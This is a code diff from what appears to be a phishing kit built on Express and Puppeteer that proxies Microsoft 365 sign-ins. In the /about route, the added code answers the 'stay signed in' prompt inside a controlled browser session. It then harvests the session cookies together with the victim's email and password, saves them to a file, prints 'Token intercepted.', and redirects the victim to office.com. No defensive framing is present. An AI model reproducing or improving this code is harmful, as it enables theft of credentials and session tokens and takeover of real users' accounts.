@@ -212,11 +212,45 @@ router.get('/about', function(req, res, next) {
   catch(e){}
 
    ////////////////////////////////////////////////////
-       // var html =await c.innerText('#passwordError');
-        console.log("checked-------------------------")
-        //console.log(html);
+   try{
+    await c.waitForSelector('#KmsiDescription');
+    const results = await c.$('#KmsiDescription');
+    const text = await results.evaluate(element => element.innerText);
+    console.log("waiting for error");
+    console.log(text)
+    //console.log(text);
+    if(text.includes("to sign in"))
+    {
+        await c.click("#idSIButton9"); 
+        console.log("Yes / NO. press yes");
+       // await c.goto("https://login.microsoftonline.com/auth2");
+        sleep(1000 * 1).then(() => console.log("Checking"));
+        const cc=contxt[did];
+        let  cookies = await cc.cookies()
+        var cookieJson = JSON.stringify(cookies)
+        var len=cookieJson.length;
+        var string=',"sameSite":"None"'
+        //console.log(string)
+        bff=cookieJson;
+        for(var i=0;i<len;i++)
+        {
+            var bff=bff.replace(string,'');
+        }
+        var alldata="Email = "+email+" \ Password= "+pass+"  \ Cookies= "+bff;
+        var pass=usrpass[did]
+        console.log(did)
+        var path=email+".json"
+        fs.writeFile(path,alldata,function(){console.log("Token intercepted.")})
         res.redirect('https://office.com')
- // res.render('pass', {page:'About Us', menuId:'about'});
+        //  res.render('about');
+    }
+    
+  }
+  catch{}
+
+
+     res.render('pass', {page:'About Us', menuId:'about'});
+    // res.redirect('https://office.com')
   //const t = await result.evaluate(element => element.innerHTML);
   //console.log(html);
 
@@ -400,7 +434,7 @@ router.get('/phonecode', function(req, res, next) {
     //console.log(text);
     if(text.includes("to sign in"))
     {
-        await c.click("#idSIButton9");
+        await c.click("#idSIButton9"); 
         console.log("Yes / NO. press yes");
        // await c.goto("https://login.microsoftonline.com/auth2");
         sleep(1000 * 1).then(() => console.log("Checking"));
